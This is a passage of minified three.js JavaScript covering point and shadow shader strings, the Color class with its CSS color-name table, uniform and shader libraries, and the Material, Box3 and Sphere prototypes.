<morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP )\\n\\tvViewPosition = - mvPosition.xyz;\\n#endif\\n}\\n\",\npoints_frag:\"uniform vec3 diffuse;\\nuniform float opacity;\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <map_particle_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec3 outgoingLight = vec3( 0.0 );\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_particle_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphatest_fragment>\\n\\toutgoingLight = diffuseColor.rgb;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\",\npoints_vert:\"uniform float size;\\nuniform float scale;\\n#include <common>\\n#include <color_pars_vertex>\\n#include <fog_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <color_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#ifdef USE_SIZEATTENUATION\\n\\t\\tgl_PointSize = size * ( scale / - mvPosition.z );\\n\\t#else\\n\\t\\tgl_PointSize = size;\\n\\t#endif\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n\\t#include <fog_vertex>\\n}\\n\",\nshadow_frag:\"uniform float opacity;\\n#include <common>\\n#include <packing>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <shadowmap_pars_fragment>\\n#include <shadowmask_pars_fragment>\\nvoid main() {\\n\\tgl_FragColor = vec4( 0.0, 0.0, 0.0, opacity * ( 1.0 - getShadowMask() ) );\\n}\\n\",shadow_vert:\"#include <shadowmap_pars_vertex>\\nvoid main() {\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\"};J.prototype={constructor:J,\nisColor:!0,r:1,g:1,b:1,set:function(a){a&&a.isColor?this.copy(a):\"number\"===typeof a?this.setHex(a):\"string\"===typeof a&&this.setStyle(a);return this},setScalar:function(a){this.b=this.g=this.r=a;return this},setHex:function(a){a=Math.floor(a);this.r=(a>>16&255)/255;this.g=(a>>8&255)/255;this.b=(a&255)/255;return this},setRGB:function(a,b,c){this.r=a;this.g=b;this.b=c;return this},setHSL:function(){function a(a,c,d){0>d&&(d+=1);1<d&&--d;return d<1/6?a+6*(c-a)*d:.5>d?c:d<2/3?a+6*(c-a)*(2/3-d):a}return function(b,\nc,d){b=N.euclideanModulo(b,1);c=N.clamp(c,0,1);d=N.clamp(d,0,1);0===c?this.r=this.g=this.b=d:(c=.5>=d?d*(1+c):d+c-d*c,d=2*d-c,this.r=a(d,c,b+1/3),this.g=a(d,c,b),this.b=a(d,c,b-1/3));return this}}(),setStyle:function(a){function b(b){void 0!==b&&1>parseFloat(b)&&console.warn(\"THREE.Color: Alpha component of \"+a+\" will be ignored.\")}var c;if(c=/^((?:rgb|hsl)a?)\\(\\s*([^\\)]*)\\)/.exec(a)){var d=c[2];switch(c[1]){case \"rgb\":case \"rgba\":if(c=/^(\\d+)\\s*,\\s*(\\d+)\\s*,\\s*(\\d+)\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d))return this.r=\nMath.min(255,parseInt(c[1],10))/255,this.g=Math.min(255,parseInt(c[2],10))/255,this.b=Math.min(255,parseInt(c[3],10))/255,b(c[5]),this;if(c=/^(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d))return this.r=Math.min(100,parseInt(c[1],10))/100,this.g=Math.min(100,parseInt(c[2],10))/100,this.b=Math.min(100,parseInt(c[3],10))/100,b(c[5]),this;break;case \"hsl\":case \"hsla\":if(c=/^([0-9]*\\.?[0-9]+)\\s*,\\s*(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d)){var d=parseFloat(c[1])/\n360,e=parseInt(c[2],10)/100,f=parseInt(c[3],10)/100;b(c[5]);return this.setHSL(d,e,f)}}}else if(c=/^\\#([A-Fa-f0-9]+)$/.exec(a)){c=c[1];d=c.length;if(3===d)return this.r=parseInt(c.charAt(0)+c.charAt(0),16)/255,this.g=parseInt(c.charAt(1)+c.charAt(1),16)/255,this.b=parseInt(c.charAt(2)+c.charAt(2),16)/255,this;if(6===d)return this.r=parseInt(c.charAt(0)+c.charAt(1),16)/255,this.g=parseInt(c.charAt(2)+c.charAt(3),16)/255,this.b=parseInt(c.charAt(4)+c.charAt(5),16)/255,this}a&&0<a.length&&(c=Wf[a],void 0!==\nc?this.setHex(c):console.warn(\"THREE.Color: Unknown color \"+a));return this},clone:function(){return new this.constructor(this.r,this.g,this.b)},copy:function(a){this.r=a.r;this.g=a.g;this.b=a.b;return this},copyGammaToLinear:function(a,b){void 0===b&&(b=2);this.r=Math.pow(a.r,b);this.g=Math.pow(a.g,b);this.b=Math.pow(a.b,b);return this},copyLinearToGamma:function(a,b){void 0===b&&(b=2);var c=0<b?1/b:1;this.r=Math.pow(a.r,c);this.g=Math.pow(a.g,c);this.b=Math.pow(a.b,c);return this},convertGammaToLinear:function(){var a=\nthis.r,b=this.g,c=this.b;this.r=a*a;this.g=b*b;this.b=c*c;return this},convertLinearToGamma:function(){this.r=Math.sqrt(this.r);this.g=Math.sqrt(this.g);this.b=Math.sqrt(this.b);return this},getHex:function(){return 255*this.r<<16^255*this.g<<8^255*this.b<<0},getHexString:function(){return(\"000000\"+this.getHex().toString(16)).slice(-6)},getHSL:function(a){a=a||{h:0,s:0,l:0};var b=this.r,c=this.g,d=this.b,e=Math.max(b,c,d),f=Math.min(b,c,d),g,h=(f+e)/2;if(f===e)f=g=0;else{var m=e-f,f=.5>=h?m/(e+f):\nm/(2-e-f);switch(e){case b:g=(c-d)/m+(c<d?6:0);break;case c:g=(d-b)/m+2;break;case d:g=(b-c)/m+4}g/=6}a.h=g;a.s=f;a.l=h;return a},getStyle:function(){return\"rgb(\"+(255*this.r|0)+\",\"+(255*this.g|0)+\",\"+(255*this.b|0)+\")\"},offsetHSL:function(a,b,c){var d=this.getHSL();d.h+=a;d.s+=b;d.l+=c;this.setHSL(d.h,d.s,d.l);return this},add:function(a){this.r+=a.r;this.g+=a.g;this.b+=a.b;return this},addColors:function(a,b){this.r=a.r+b.r;this.g=a.g+b.g;this.b=a.b+b.b;return this},addScalar:function(a){this.r+=\na;this.g+=a;this.b+=a;return this},sub:function(a){this.r=Math.max(0,this.r-a.r);this.g=Math.max(0,this.g-a.g);this.b=Math.max(0,this.b-a.b);return this},multiply:function(a){this.r*=a.r;this.g*=a.g;this.b*=a.b;return this},multiplyScalar:function(a){this.r*=a;this.g*=a;this.b*=a;return this},lerp:function(a,b){this.r+=(a.r-this.r)*b;this.g+=(a.g-this.g)*b;this.b+=(a.b-this.b)*b;return this},equals:function(a){return a.r===this.r&&a.g===this.g&&a.b===this.b},fromArray:function(a,b){void 0===b&&(b=\n0);this.r=a[b];this.g=a[b+1];this.b=a[b+2];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.r;a[b+1]=this.g;a[b+2]=this.b;return a},toJSON:function(){return this.getHex()}};var Wf={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,\ncornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,\nfloralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,\nlightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,\nmoccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,\nsilver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074};eb.prototype=Object.create(ea.prototype);eb.prototype.constructor=eb;eb.prototype.isDataTexture=!0;var V={common:{diffuse:{value:new J(15658734)},opacity:{value:1},map:{value:null},offsetRepeat:{value:new fa(0,\n0,1,1)},specularMap:{value:null},alphaMap:{value:null},envMap:{value:null},flipEnvMap:{value:-1},reflectivity:{value:1},refractionRatio:{value:.98}},aomap:{aoMap:{value:null},aoMapIntensity:{value:1}},lightmap:{lightMap:{value:null},lightMapIntensity:{value:1}},emissivemap:{emissiveMap:{value:null}},bumpmap:{bumpMap:{value:null},bumpScale:{value:1}},normalmap:{normalMap:{value:null},normalScale:{value:new D(1,1)}},displacementmap:{displacementMap:{value:null},displacementScale:{value:1},displacementBias:{value:0}},\nroughnessmap:{roughnessMap:{value:null}},metalnessmap:{metalnessMap:{value:null}},gradientmap:{gradientMap:{value:null}},fog:{fogDensity:{value:2.5E-4},fogNear:{value:1},fogFar:{value:2E3},fogColor:{value:new J(16777215)}},lights:{ambientLightColor:{value:[]},directionalLights:{value:[],properties:{direction:{},color:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},directionalShadowMap:{value:[]},directionalShadowMatrix:{value:[]},spotLights:{value:[],properties:{color:{},position:{},\ndirection:{},distance:{},coneCos:{},penumbraCos:{},decay:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},spotShadowMap:{value:[]},spotShadowMatrix:{value:[]},pointLights:{value:[],properties:{color:{},position:{},decay:{},distance:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},pointShadowMap:{value:[]},pointShadowMatrix:{value:[]},hemisphereLights:{value:[],properties:{direction:{},skyColor:{},groundColor:{}}},rectAreaLights:{value:[],properties:{color:{},position:{},\nwidth:{},height:{}}}},points:{diffuse:{value:new J(15658734)},opacity:{value:1},size:{value:1},scale:{value:1},map:{value:null},offsetRepeat:{value:new fa(0,0,1,1)}}},bb={basic:{uniforms:Ja.merge([V.common,V.aomap,V.lightmap,V.fog]),vertexShader:Z.meshbasic_vert,fragmentShader:Z.meshbasic_frag},lambert:{uniforms:Ja.merge([V.common,V.aomap,V.lightmap,V.emissivemap,V.fog,V.lights,{emissive:{value:new J(0)}}]),vertexShader:Z.meshlambert_vert,fragmentShader:Z.meshlambert_frag},phong:{uniforms:Ja.merge([V.common,\nV.aomap,V.lightmap,V.emissivemap,V.bumpmap,V.normalmap,V.displacementmap,V.gradientmap,V.fog,V.lights,{emissive:{value:new J(0)},specular:{value:new J(1118481)},shininess:{value:30}}]),vertexShader:Z.meshphong_vert,fragmentShader:Z.meshphong_frag},standard:{uniforms:Ja.merge([V.common,V.aomap,V.lightmap,V.emissivemap,V.bumpmap,V.normalmap,V.displacementmap,V.roughnessmap,V.metalnessmap,V.fog,V.lights,{emissive:{value:new J(0)},roughness:{value:.5},metalness:{value:0},envMapIntensity:{value:1}}]),\nvertexShader:Z.meshphysical_vert,fragmentShader:Z.meshphysical_frag},points:{uniforms:Ja.merge([V.points,V.fog]),vertexShader:Z.points_vert,fragmentShader:Z.points_frag},dashed:{uniforms:Ja.merge([V.common,V.fog,{scale:{value:1},dashSize:{value:1},totalSize:{value:2}}]),vertexShader:Z.linedashed_vert,fragmentShader:Z.linedashed_frag},depth:{uniforms:Ja.merge([V.common,V.displacementmap]),vertexShader:Z.depth_vert,fragmentShader:Z.depth_frag},normal:{uniforms:Ja.merge([V.common,V.bumpmap,V.normalmap,\nV.displacementmap,{opacity:{value:1}}]),vertexShader:Z.normal_vert,fragmentShader:Z.normal_frag},cube:{uniforms:{tCube:{value:null},tFlip:{value:-1},opacity:{value:1}},vertexShader:Z.cube_vert,fragmentShader:Z.cube_frag},equirect:{uniforms:{tEquirect:{value:null},tFlip:{value:-1}},vertexShader:Z.equirect_vert,fragmentShader:Z.equirect_frag},distanceRGBA:{uniforms:{lightPos:{value:new q}},vertexShader:Z.distanceRGBA_vert,fragmentShader:Z.distanceRGBA_frag}};bb.physical={uniforms:Ja.merge([bb.standard.uniforms,\n{clearCoat:{value:0},clearCoatRoughness:{value:0}}]),vertexShader:Z.meshphysical_vert,fragmentShader:Z.meshphysical_frag};sc.prototype={constructor:sc,set:function(a,b){this.min.copy(a);this.max.copy(b);return this},setFromPoints:function(a){this.makeEmpty();for(var b=0,c=a.length;b<c;b++)this.expandByPoint(a[b]);return this},setFromCenterAndSize:function(){var a=new D;return function(b,c){var d=a.copy(c).multiplyScalar(.5);this.min.copy(b).sub(d);this.max.copy(b).add(d);return this}}(),clone:function(){return(new this.constructor).copy(this)},\ncopy:function(a){this.min.copy(a.min);this.max.copy(a.max);return this},makeEmpty:function(){this.min.x=this.min.y=Infinity;this.max.x=this.max.y=-Infinity;return this},isEmpty:function(){return this.max.x<this.min.x||this.max.y<this.min.y},getCenter:function(a){a=a||new D;return this.isEmpty()?a.set(0,0):a.addVectors(this.min,this.max).multiplyScalar(.5)},getSize:function(a){a=a||new D;return this.isEmpty()?a.set(0,0):a.subVectors(this.max,this.min)},expandByPoint:function(a){this.min.min(a);this.max.max(a);\nreturn this},expandByVector:function(a){this.min.sub(a);this.max.add(a);return this},expandByScalar:function(a){this.min.addScalar(-a);this.max.addScalar(a);return this},containsPoint:function(a){return a.x<this.min.x||a.x>this.max.x||a.y<this.min.y||a.y>this.max.y?!1:!0},containsBox:function(a){return this.min.x<=a.min.x&&a.max.x<=this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y},getParameter:function(a,b){return(b||new D).set((a.x-this.min.x)/(this.max.x-this.min.x),(a.y-this.min.y)/(this.max.y-\nthis.min.y))},intersectsBox:function(a){return a.max.x<this.min.x||a.min.x>this.max.x||a.max.y<this.min.y||a.min.y>this.max.y?!1:!0},clampPoint:function(a,b){return(b||new D).copy(a).clamp(this.min,this.max)},distanceToPoint:function(){var a=new D;return function(b){return a.copy(b).clamp(this.min,this.max).sub(b).length()}}(),intersect:function(a){this.min.max(a.min);this.max.min(a.max);return this},union:function(a){this.min.min(a.min);this.max.max(a.max);return this},translate:function(a){this.min.add(a);\nthis.max.add(a);return this},equals:function(a){return a.min.equals(this.min)&&a.max.equals(this.max)}};var Af=0;X.prototype={constructor:X,isMaterial:!0,get needsUpdate(){return this._needsUpdate},set needsUpdate(a){!0===a&&this.update();this._needsUpdate=a},setValues:function(a){if(void 0!==a)for(var b in a){var c=a[b];if(void 0===c)console.warn(\"THREE.Material: '\"+b+\"' parameter is undefined.\");else{var d=this[b];void 0===d?console.warn(\"THREE.\"+this.type+\": '\"+b+\"' is not a property of this material.\"):\nd&&d.isColor?d.set(c):d&&d.isVector3&&c&&c.isVector3?d.copy(c):this[b]=\"overdraw\"===b?Number(c):c}}},toJSON:function(a){function b(a){var b=[],c;for(c in a){var d=a[c];delete d.metadata;b.push(d)}return b}var c=void 0===a;c&&(a={textures:{},images:{}});var d={metadata:{version:4.4,type:\"Material\",generator:\"Material.toJSON\"}};d.uuid=this.uuid;d.type=this.type;\"\"!==this.name&&(d.name=this.name);this.color&&this.color.isColor&&(d.color=this.color.getHex());void 0!==this.roughness&&(d.roughness=this.roughness);\nvoid 0!==this.metalness&&(d.metalness=this.metalness);this.emissive&&this.emissive.isColor&&(d.emissive=this.emissive.getHex());this.specular&&this.specular.isColor&&(d.specular=this.specular.getHex());void 0!==this.shininess&&(d.shininess=this.shininess);void 0!==this.clearCoat&&(d.clearCoat=this.clearCoat);void 0!==this.clearCoatRoughness&&(d.clearCoatRoughness=this.clearCoatRoughness);this.map&&this.map.isTexture&&(d.map=this.map.toJSON(a).uuid);this.alphaMap&&this.alphaMap.isTexture&&(d.alphaMap=\nthis.alphaMap.toJSON(a).uuid);this.lightMap&&this.lightMap.isTexture&&(d.lightMap=this.lightMap.toJSON(a).uuid);this.bumpMap&&this.bumpMap.isTexture&&(d.bumpMap=this.bumpMap.toJSON(a).uuid,d.bumpScale=this.bumpScale);this.normalMap&&this.normalMap.isTexture&&(d.normalMap=this.normalMap.toJSON(a).uuid,d.normalScale=this.normalScale.toArray());this.displacementMap&&this.displacementMap.isTexture&&(d.displacementMap=this.displacementMap.toJSON(a).uuid,d.displacementScale=this.displacementScale,d.displacementBias=\nthis.displacementBias);this.roughnessMap&&this.roughnessMap.isTexture&&(d.roughnessMap=this.roughnessMap.toJSON(a).uuid);this.metalnessMap&&this.metalnessMap.isTexture&&(d.metalnessMap=this.metalnessMap.toJSON(a).uuid);this.emissiveMap&&this.emissiveMap.isTexture&&(d.emissiveMap=this.emissiveMap.toJSON(a).uuid);this.specularMap&&this.specularMap.isTexture&&(d.specularMap=this.specularMap.toJSON(a).uuid);this.envMap&&this.envMap.isTexture&&(d.envMap=this.envMap.toJSON(a).uuid,d.reflectivity=this.reflectivity);\nthis.gradientMap&&this.gradientMap.isTexture&&(d.gradientMap=this.gradientMap.toJSON(a).uuid);void 0!==this.size&&(d.size=this.size);void 0!==this.sizeAttenuation&&(d.sizeAttenuation=this.sizeAttenuation);1!==this.blending&&(d.blending=this.blending);2!==this.shading&&(d.shading=this.shading);0!==this.side&&(d.side=this.side);0!==this.vertexColors&&(d.vertexColors=this.vertexColors);1>this.opacity&&(d.opacity=this.opacity);!0===this.transparent&&(d.transparent=this.transparent);d.depthFunc=this.depthFunc;\nd.depthTest=this.depthTest;d.depthWrite=this.depthWrite;0<this.alphaTest&&(d.alphaTest=this.alphaTest);!0===this.premultipliedAlpha&&(d.premultipliedAlpha=this.premultipliedAlpha);!0===this.wireframe&&(d.wireframe=this.wireframe);1<this.wireframeLinewidth&&(d.wireframeLinewidth=this.wireframeLinewidth);\"round\"!==this.wireframeLinecap&&(d.wireframeLinecap=this.wireframeLinecap);\"round\"!==this.wireframeLinejoin&&(d.wireframeLinejoin=this.wireframeLinejoin);d.skinning=this.skinning;d.morphTargets=this.morphTargets;\nc&&(c=b(a.textures),a=b(a.images),0<c.length&&(d.textures=c),0<a.length&&(d.images=a));return d},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.name=a.name;this.fog=a.fog;this.lights=a.lights;this.blending=a.blending;this.side=a.side;this.shading=a.shading;this.vertexColors=a.vertexColors;this.opacity=a.opacity;this.transparent=a.transparent;this.blendSrc=a.blendSrc;this.blendDst=a.blendDst;this.blendEquation=a.blendEquation;this.blendSrcAlpha=a.blendSrcAlpha;this.blendDstAlpha=\na.blendDstAlpha;this.blendEquationAlpha=a.blendEquationAlpha;this.depthFunc=a.depthFunc;this.depthTest=a.depthTest;this.depthWrite=a.depthWrite;this.colorWrite=a.colorWrite;this.precision=a.precision;this.polygonOffset=a.polygonOffset;this.polygonOffsetFactor=a.polygonOffsetFactor;this.polygonOffsetUnits=a.polygonOffsetUnits;this.alphaTest=a.alphaTest;this.premultipliedAlpha=a.premultipliedAlpha;this.overdraw=a.overdraw;this.visible=a.visible;this.clipShadows=a.clipShadows;this.clipIntersection=a.clipIntersection;\na=a.clippingPlanes;var b=null;if(null!==a)for(var c=a.length,b=Array(c),d=0;d!==c;++d)b[d]=a[d].clone();this.clippingPlanes=b;return this},update:function(){this.dispatchEvent({type:\"update\"})},dispose:function(){this.dispatchEvent({type:\"dispose\"})}};Object.assign(X.prototype,pa.prototype);Ha.prototype=Object.create(X.prototype);Ha.prototype.constructor=Ha;Ha.prototype.isShaderMaterial=!0;Ha.prototype.copy=function(a){X.prototype.copy.call(this,a);this.fragmentShader=a.fragmentShader;this.vertexShader=\na.vertexShader;this.uniforms=Ja.clone(a.uniforms);this.defines=a.defines;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.lights=a.lights;this.clipping=a.clipping;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;this.extensions=a.extensions;return this};Ha.prototype.toJSON=function(a){a=X.prototype.toJSON.call(this,a);a.uniforms=this.uniforms;a.vertexShader=this.vertexShader;a.fragmentShader=this.fragmentShader;return a};ab.prototype=\nObject.create(X.prototype);ab.prototype.constructor=ab;ab.prototype.isMeshDepthMaterial=!0;ab.prototype.copy=function(a){X.prototype.copy.call(this,a);this.depthPacking=a.depthPacking;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.map=a.map;this.alphaMap=a.alphaMap;this.displacementMap=a.displacementMap;this.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;return this};Pa.prototype=\n{constructor:Pa,isBox3:!0,set:function(a,b){this.min.copy(a);this.max.copy(b);return this},setFromArray:function(a){for(var b=Infinity,c=Infinity,d=Infinity,e=-Infinity,f=-Infinity,g=-Infinity,h=0,m=a.length;h<m;h+=3){var k=a[h],l=a[h+1],p=a[h+2];k<b&&(b=k);l<c&&(c=l);p<d&&(d=p);k>e&&(e=k);l>f&&(f=l);p>g&&(g=p)}this.min.set(b,c,d);this.max.set(e,f,g);return this},setFromBufferAttribute:function(a){for(var b=Infinity,c=Infinity,d=Infinity,e=-Infinity,f=-Infinity,g=-Infinity,h=0,m=a.count;h<m;h++){var k=\na.getX(h),l=a.getY(h),p=a.getZ(h);k<b&&(b=k);l<c&&(c=l);p<d&&(d=p);k>e&&(e=k);l>f&&(f=l);p>g&&(g=p)}this.min.set(b,c,d);this.max.set(e,f,g);return this},setFromPoints:function(a){this.makeEmpty();for(var b=0,c=a.length;b<c;b++)this.expandByPoint(a[b]);return this},setFromCenterAndSize:function(){var a=new q;return function(b,c){var d=a.copy(c).multiplyScalar(.5);this.min.copy(b).sub(d);this.max.copy(b).add(d);return this}}(),setFromObject:function(a){this.makeEmpty();return this.expandByObject(a)},\nclone:function(){return(new this.constructor).copy(this)},copy:function(a){this.min.copy(a.min);this.max.copy(a.max);return this},makeEmpty:function(){this.min.x=this.min.y=this.min.z=Infinity;this.max.x=this.max.y=this.max.z=-Infinity;return this},isEmpty:function(){return this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z},getCenter:function(a){a=a||new q;return this.isEmpty()?a.set(0,0,0):a.addVectors(this.min,this.max).multiplyScalar(.5)},getSize:function(a){a=a||new q;return this.isEmpty()?\na.set(0,0,0):a.subVectors(this.max,this.min)},expandByPoint:function(a){this.min.min(a);this.max.max(a);return this},expandByVector:function(a){this.min.sub(a);this.max.add(a);return this},expandByScalar:function(a){this.min.addScalar(-a);this.max.addScalar(a);return this},expandByObject:function(){var a=new q;return function(b){var c=this;b.updateMatrixWorld(!0);b.traverse(function(b){var e,f;e=b.geometry;if(void 0!==e)if(e.isGeometry){var g=e.vertices;e=0;for(f=g.length;e<f;e++)a.copy(g[e]),a.applyMatrix4(b.matrixWorld),\nc.expandByPoint(a)}else if(e.isBufferGeometry&&(g=e.attributes.position,void 0!==g))for(e=0,f=g.count;e<f;e++)a.fromBufferAttribute(g,e).applyMatrix4(b.matrixWorld),c.expandByPoint(a)});return this}}(),containsPoint:function(a){return a.x<this.min.x||a.x>this.max.x||a.y<this.min.y||a.y>this.max.y||a.z<this.min.z||a.z>this.max.z?!1:!0},containsBox:function(a){return this.min.x<=a.min.x&&a.max.x<=this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y&&this.min.z<=a.min.z&&a.max.z<=this.max.z},getParameter:function(a,\nb){return(b||new q).set((a.x-this.min.x)/(this.max.x-this.min.x),(a.y-this.min.y)/(this.max.y-this.min.y),(a.z-this.min.z)/(this.max.z-this.min.z))},intersectsBox:function(a){return a.max.x<this.min.x||a.min.x>this.max.x||a.max.y<this.min.y||a.min.y>this.max.y||a.max.z<this.min.z||a.min.z>this.max.z?!1:!0},intersectsSphere:function(){var a;return function(b){void 0===a&&(a=new q);this.clampPoint(b.center,a);return a.distanceToSquared(b.center)<=b.radius*b.radius}}(),intersectsPlane:function(a){var b,\nc;0<a.normal.x?(b=a.normal.x*this.min.x,c=a.normal.x*this.max.x):(b=a.normal.x*this.max.x,c=a.normal.x*this.min.x);0<a.normal.y?(b+=a.normal.y*this.min.y,c+=a.normal.y*this.max.y):(b+=a.normal.y*this.max.y,c+=a.normal.y*this.min.y);0<a.normal.z?(b+=a.normal.z*this.min.z,c+=a.normal.z*this.max.z):(b+=a.normal.z*this.max.z,c+=a.normal.z*this.min.z);return b<=a.constant&&c>=a.constant},clampPoint:function(a,b){return(b||new q).copy(a).clamp(this.min,this.max)},distanceToPoint:function(){var a=new q;\nreturn function(b){return a.copy(b).clamp(this.min,this.max).sub(b).length()}}(),getBoundingSphere:function(){var a=new q;return function(b){b=b||new Na;this.getCenter(b.center);b.radius=.5*this.getSize(a).length();return b}}(),intersect:function(a){this.min.max(a.min);this.max.min(a.max);this.isEmpty()&&this.makeEmpty();return this},union:function(a){this.min.min(a.min);this.max.max(a.max);return this},applyMatrix4:function(){var a=[new q,new q,new q,new q,new q,new q,new q,new q];return function(b){if(this.isEmpty())return this;\na[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(b);a[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(b);a[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(b);a[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(b);a[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(b);a[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(b);a[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(b);a[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(b);this.setFromPoints(a);return this}}(),\ntranslate:function(a){this.min.add(a);this.max.add(a);return this},equals:function(a){return a.min.equals(this.min)&&a.max.equals(this.max)}};Na.prototype={constructor:Na,set:function(a,b){this.center.copy(a);this.radius=b;return this},setFromPoints:function(){var a;return function(b,c){void 0===a&&(a=new Pa);var d=this.center;void 0!==c?d.copy(c):a.setFromPoints(b).getCenter(d);for(var e=0,f=0,g=b.length;f<g;f++)e=Math.max(e,d.distanceToSquared(b[f]));this.radius=Math.sqrt(e);return this}}(),clone:function(){return(new this.constructor).copy(this)},\ncopy:function(a){this.center.copy(a.center);this.radius=a.radius;return this},empty:function(){return 0>=this.radius},containsPoint:function(a){return a.distanceToSquared(this.center)<=this.radius*this.radius},distanceToPoint:function(a){return a.distanceTo(this.center)-this.radius},intersectsSphere:function(a){var b=this.radius+a.radius;return a.center.distanceToSquared(this.center)<=b*b},intersectsBox:function(a){return a.intersectsSphere(this)},intersectsPlane:function(a){return Math.abs(this.center.dot(a.normal)-\na.constant)<=this.radius},clampPoint:function(a,b){var c=this.center.distanceToSquared(a),d=b||new q;d.copy(a);c>this.radius*this.radius&&(d.sub(this.center).normalize(),d.multiplyScalar(this.radius).add(this.center));return d},getBoundingBox:function(a){a=a||new Pa;a.set(this.center,this.center);a.expandByScalar(this.radius);return a},applyMatrix4:function(a){this.center.applyMatrix4(a);this.radius*=a.getMaxScaleOnAxis();return this},translate:function(a){this.center.add(a);return this},equals:function(a){return a.center.equals(this.center)&&\na.radius===this.radius}};ya.prototype={constructor:ya,isMatrix3:!0,set:function(a,b,c,d,e,f,g,h,m){var 